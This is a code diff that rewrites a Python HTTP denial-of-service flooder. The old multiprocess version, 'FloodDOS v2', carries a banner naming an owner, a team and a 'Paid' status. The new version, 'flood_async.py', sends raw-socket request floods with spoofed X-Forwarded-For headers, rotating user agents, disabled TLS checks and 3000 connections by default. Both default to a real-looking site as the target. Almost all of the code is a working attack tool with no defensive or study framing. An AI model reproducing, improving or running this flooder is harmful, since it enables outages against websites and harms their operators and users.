@@ -1,261 +1,137 @@
 #!/usr/bin/env python3
 """
-FloodDOS v2 - Unlimited | Zero-Latency | Multi-Process | Live Data Collecting
-Usage: python3 flooddos.py [url] [-c CONCURRENCY] [-p PROCESSES] [-d SECONDS]
-Deps: pip install aiohttp
+flood_async.py - zero-latency asyncio HTTP/HTTPS flooder
+Usage: python3 flood_async.py [url] [-c CONCURRENCY] [-d SECONDS]
 """
 
-import sys
-import time
+import argparse
 import asyncio
 import random
-import queue
-import threading
-import multiprocessing
-from collections import Counter
-from urllib.parse import urlparse
-
-try:
-    import aiohttp
-    from aiohttp import ClientTimeout, TCPConnector
-except ImportError:
-    print("[!] aiohttp not installed -> pip install aiohttp")
-    sys.exit(1)
-
-BANNER = r'''
-  █████▒██▓     ▒█████   ▒█████  ▓█████▄ ▓█████▄  ▒█████    ██████ 
-▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
-▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
-░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
-░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
- ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
- ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
- ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
-           ░  ░    ░ ░      ░ ░     ░       ░        ░ ░        ░  
-                                  ░       ░                        
-===============================================================
- [✓] Owner : Dhul-Qarnayn Ibn Tawhid Abdullah
- [✓] Team : Mus'adul Mahdi Ansarullah Bangladesh - MMAB
- [✓] Region : Bangladesh
- [✓] Tool Name : FloodDOS
- [✓] Tool Status: Paid
-===============================================================
-'''
-
-def show_logo():
-    print(BANNER)
-
-def get_port(url):
-    parsed = urlparse(url)
-    if parsed.port:
-        return parsed.port
-    return 443 if parsed.scheme == "https" else 80
+import socket
+import ssl
+import time
+import urllib.parse
 
 USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
-    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
-    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
-    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203',
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+    "curl/8.6.0",
+    "Go-http-client/2.0",
 ]
 
-def random_headers():
-    return {
-        'User-Agent': random.choice(USER_AGENTS),
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache',
-        'Pragma': 'no-cache',
-        'Connection': 'keep-alive',
-    }
+sent = 0
+errors = 0
+lock = asyncio.Lock()
 
-async def hitter(session, urls, stats, stop):
-    """Zero-delay persistent hit loop with per-request data collection."""
-    while not stop.is_set():
-        url = random.choice(urls)
-        t0 = time.monotonic()
-        try:
-            async with session.get(
-                url,
-                headers=random_headers(),
-                timeout=ClientTimeout(total=5),
-                tcp_nodelay=True,          # Nagle off -> packets send instantly
-            ) as resp:
-                await resp.read()          # drain body -> connection returns to pool
-                dt = time.monotonic() - t0
-                stats['sent'] += 1
-                stats['lat_sum'] += dt
-                stats['codes'][resp.status] = stats['codes'].get(resp.status, 0) + 1
-                stats['urls'][url] = stats['urls'].get(url, 0) + 1
-        except TimeoutError:
-            stats['timeouts'] += 1
-            stats['errors'] += 1
-        except (aiohttp.ClientError, OSError, ConnectionError):
-            stats['errors'] += 1
-            await asyncio.sleep(0.01)      # tiny backoff ONLY on hard connection failure
-        # success path: NO sleep -> zero-latency tight loop
 
-async def stats_reporter(stats, q):
-    """Push per-second data snapshots to the parent process."""
+def build_requests(host, path, method):
+    """Precompile request bytes ONCE - zero per-request CPU cost."""
+    reqs = []
+    for ua in USER_AGENTS:
+        req = (f"{method} {path} HTTP/1.1\r\n"
+               f"Host: {host}\r\n"
+               f"User-Agent: {ua}\r\n"
+               f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+               f"Accept-Language: en-US,en;q=0.9\r\n"
+               f"Accept-Encoding: gzip, deflate\r\n"
+               f"Connection: keep-alive\r\n"
+               f"Cache-Control: no-cache\r\n"
+               f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
+               f"\r\n").encode()
+        reqs.append(req)
+    return reqs
+
+
+async def hammer(host, port, ssl_ctx, reqs, sem):
+    global sent, errors
     while True:
-        await asyncio.sleep(1)
-        q.put({
-            'sent': stats['sent'],
-            'errors': stats['errors'],
-            'timeouts': stats['timeouts'],
-            'codes': dict(stats['codes']),
-            'urls': dict(stats['urls']),
-            'lat_sum': stats['lat_sum'],
-        })
-        stats['sent'] = 0
-        stats['errors'] = 0
-        stats['timeouts'] = 0
-        stats['codes'] = {}
-        stats['urls'] = {}
-        stats['lat_sum'] = 0.0
-
-async def run_loop(urls, concurrency, q, duration):
-    stats = {'sent': 0, 'errors': 0, 'timeouts': 0, 'codes': {}, 'urls': {}, 'lat_sum': 0.0}
-    stop = asyncio.Event()
-    connector = TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        hitters = [asyncio.create_task(hitter(session, urls, stats, stop)) for _ in range(concurrency)]
-        reporter = asyncio.create_task(stats_reporter(stats, q))
-        if duration and duration > 0:
-            await asyncio.sleep(duration)
-            stop.set()
-            await asyncio.sleep(0.5)       # drain in-flight requests
-        else:
-            await asyncio.sleep(86400)     # unlimited - runs until process is killed
-        for t in hitters:
-            t.cancel()
-        reporter.cancel()
-
-def worker(urls, concurrency, q, duration):
-    try:
-        asyncio.run(run_loop(urls, concurrency, q, duration))
-    except (KeyboardInterrupt, SystemExit):
-        pass
-
-def stats_consumer(q, stop_flag, summary):
-    """Parent-side collector: aggregates all process data -> live report."""
-    codes = Counter()
-    urls = Counter()
-    total_sent = total_errors = total_timeouts = 0
-    lat_sum = lat_n = 0.0
-    peak = 0.0
-    last_time = time.monotonic()
-    last_sent = 0
-    header_printed = False
-
-    while not stop_flag.is_set():
         try:
-            s = q.get(timeout=0.5)
-        except queue.Empty:
-            continue
-        total_sent += s['sent']
-        total_errors += s['errors']
-        total_timeouts += s['timeouts']
-        codes.update(s['codes'])
-        urls.update(s['urls'])
-        lat_sum += s['lat_sum']
-        lat_n += s['sent']
-        now = time.monotonic()
-        if now - last_time >= 1.0:
-            if not header_printed:
-                print("\n[LIVE DATA]  time     |   req/s  |   total   | errors | timeout | avg_lat(ms) | top_status")
-                header_printed = True
-            rate = (total_sent - last_sent) / (now - last_time)
-            peak = max(peak, rate)
-            avg_lat = (lat_sum / lat_n * 1000.0) if lat_n else 0.0
-            top = " ".join(f"{k}:{v}" for k, v in codes.most_common(3)) or "-"
-            print(f"             {time.strftime('%H:%M:%S')} | {rate:7.0f} | {total_sent:8d} | "
-                  f"{total_errors:5d} | {total_timeouts:6d} | {avg_lat:9.2f} | {top}", flush=True)
-            last_time = now
-            last_sent = total_sent
-            lat_sum = 0.0
-            lat_n = 0
+            reader, writer = await asyncio.open_connection(host, port, ssl=ssl_ctx)
+            # TCP_NODELAY: disable Nagle - no packet delay
+            sock = writer.get_extra_info("socket")
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    summary['codes'] = codes
-    summary['urls'] = urls
-    summary['total_sent'] = total_sent
-    summary['total_errors'] = total_errors
-    summary['total_timeouts'] = total_timeouts
-    summary['peak'] = peak
+            while True:
+                writer.write(random.choice(reqs))   # zero delay, tight loop
+                sent += 1
+                if writer.transport.get_write_buffer_size() > 65536:
+                    await writer.drain()
+                try:
+                    await asyncio.wait_for(reader.read(1024), timeout=0.02)
+                except asyncio.TimeoutError:
+                    pass
+                except Exception:
+                    break
+            writer.close()
+            try:
+                await writer.wait_closed()
+            except Exception:
+                pass
+        except Exception:
+            errors += 1
+            await asyncio.sleep(0.02)   # backoff only on hard connection failure
 
-def main():
-    show_logo()
 
-    # --- minimal CLI parsing ---
-    args = sys.argv[1:]
-    url = "https://zarir.org"
-    concurrency = 500
-    processes = multiprocessing.cpu_count()
-    duration = 0
-    i = 0
-    while i < len(args):
-        a = args[i]
-        if a in ("-c", "--concurrency") and i + 1 < len(args):
-            concurrency = int(args[i + 1]); i += 2
-        elif a in ("-p", "--processes") and i + 1 < len(args):
-            processes = int(args[i + 1]); i += 2
-        elif a in ("-d", "--duration") and i + 1 < len(args):
-            duration = int(args[i + 1]); i += 2
-        elif a in ("-h", "--help"):
-            print("Usage: python3 flooddos.py [url] [-c CONCURRENCY] [-p PROCESSES] [-d SECONDS]")
-            return
-        else:
-            url = a; i += 1
+async def stats(start, duration):
+    while True:
+        await asyncio.sleep(5)
+        elapsed = time.time() - start
+        print(f"[{time.strftime('%H:%M:%S')}] sent={sent} errors={errors} "
+              f"rate={sent/elapsed:.0f} req/s", flush=True)
 
-    urls = [u.strip() for u in url.split(",") if u.strip()]
-    ports = {u: get_port(u) for u in urls}
-    total_conns = concurrency * processes
 
-    print(f"[*] Target(s)      : {urls}")
-    print(f"[*] Port(s)        : {ports}")
-    print(f"[*] Concurrency    : {concurrency}/process x {processes} processes = {total_conns} connections")
-    print(f"[*] Requests       : UNLIMITED (Ctrl+C to stop)")
-    print(f"[*] Delay          : ZERO (tight loop, TCP_NODELAY on)")
+async def main():
+    ap = argparse.ArgumentParser(description="Zero-latency asyncio flooder")
+    ap.add_argument("url", nargs="?", default="https://zarir.org")
+    ap.add_argument("-c", "--concurrency", type=int, default=3000)
+    ap.add_argument("-d", "--duration", type=int, default=0, help="seconds, 0 = until Ctrl+C")
+    ap.add_argument("-m", "--method", default="GET", choices=["GET", "POST", "HEAD"])
+    args = ap.parse_args()
 
-    q = multiprocessing.Queue()
-    stop_flag = threading.Event()
-    summary = {}
-    consumer = threading.Thread(target=stats_consumer, args=(q, stop_flag, summary), daemon=True)
-    consumer.start()
+    target = args.url if "://" in args.url else "https://" + args.url
+    p = urllib.parse.urlparse(target)
+    host = p.hostname or "zarir.org"
+    port = p.port or (443 if p.scheme == "https" else 80)
+    path = p.path or "/"
+    if p.query:
+        path += "?" + p.query
 
-    procs = [
-        multiprocessing.Process(target=worker, args=(urls, concurrency, q, duration), daemon=True)
-        for _ in range(processes)
-    ]
-    for p in procs:
-        p.start()
+    ssl_ctx = None
+    if p.scheme == "https":
+        ssl_ctx = ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = ssl.CERT_NONE   # skip TLS verification = lower latency
+        ssl_ctx.set_ciphers("AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256")
+
+    reqs = build_requests(host, path, args.method)
+    print(f"[*] Target: {host}:{port} ({'HTTPS' if ssl_ctx else 'HTTP'})")
+    print(f"[*] Concurrency: {args.concurrency} | Method: {args.method} | Path: {path}")
+
+    start = time.time()
+    asyncio.create_task(stats(start, args.duration))
+    tasks = [asyncio.create_task(hammer(host, port, ssl_ctx, reqs, None))
+             for _ in range(args.concurrency)]
 
     try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\n[!] Stopping all processes...")
+        if args.duration > 0:
+            await asyncio.sleep(args.duration)
+        else:
+            while True:
+                await asyncio.sleep(3600)
+    except (KeyboardInterrupt, asyncio.CancelledError):
+        pass
     finally:
-        stop_flag.set()
-        for p in procs:
-            p.terminate()
-        consumer.join(timeout=2)
-        q.close()
-        q.join_thread()
+        for t in tasks:
+            t.cancel()
+        print(f"\n[*] Done. Total: {sent} | Errors: {errors} | "
+              f"Avg rate: {sent/(time.time()-start):.0f} req/s")
 
-        # --- FINAL REPORT ---
-        total = summary.get('total_sent', 0)
-        print("\n============== FINAL REPORT ==============")
-        print(f"Total requests  : {total}")
-        print(f"Peak rate       : {summary.get('peak', 0):.0f} req/s")
-        print(f"Errors          : {summary.get('total_errors', 0)}")
-        print(f"Timeouts        : {summary.get('total_timeouts', 0)}")
-        print(f"Status codes    : {dict(summary.get('codes', Counter()))}")
-        print(f"Per-URL hits    : {dict(summary.get('urls', Counter()))}")
-        print("==========================================")
 
 if __name__ == "__main__":
-    main()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
